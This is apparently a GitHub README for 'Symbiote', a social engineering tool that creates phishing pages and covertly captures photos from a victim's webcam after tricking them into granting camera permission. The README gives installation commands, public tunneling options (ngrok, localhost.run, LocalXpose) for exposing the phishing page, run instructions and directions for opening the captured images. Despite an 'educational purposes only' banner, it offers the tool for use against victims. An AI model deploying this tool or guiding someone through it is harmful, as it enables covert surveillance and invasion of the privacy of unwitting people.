<p align="center">
  <h1>⚠️ FOR EDUCATIONAL PURPOSES ONLY ⚠️</h1>
</p>

<p align="center">
<b>Symbiote</b> is a social engineering tool designed to create phishing pages and capture images from a webcam. By requesting camera permission from the victim's device, this script can covertly take photos. If you'd like to contribute to the project, we would love to have you on board! 💻🤝
</p>

---

## 🌐 Available Tunneling Options:
1. **NGROK** [🔗 Requires Account](https://ngrok.com)
2. **Localhost.run** [🌐 Free & Easy](http://localhost.run)
3. **LOCALXPOSE** [🔗 Requires Account](https://localxpose.io)

---

## 🛠️ Installation (Kali Linux/Termux):

### Step 1: Install prerequisites
Run the following commands to ensure all necessary packages are installed:
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install python3 -y
sudo apt install wget -y
sudo apt install php -y
sudo apt install openssh-client -y
sudo apt install jq -y
sudo ssh-keygen -q -t rsa -N '' -f ~/.ssh/id_rsa <<<y >/dev/null 2>&1
```

### Step 2: Clone the repository and run
```bash
git clone https://github.com/hasanfirnas/symbiote
cd symbiote
python3 symbiote.py
```

### Step 3: Access captured data
Once you have captured a cam file, you can view it using:
```bash
cd symbiote/CapturedData
ls
termux-open <file_name>
```

---

## 📋 Prerequisites:
* Python 3 🐍
* PHP 🛠️
* wget 🌐

---

## 📸 Screenshot (Kali Linux):
![Symbiote Screenshot](https://i.imgur.com/PP51q6i.jpeg)

---

## 📽️ Video Tutorial (Step-by-step commands):
[![Watch the video](https://i.imgur.com/PP51q6i.jpeg)](https://youtu.be/j8rTc3CI7UA)

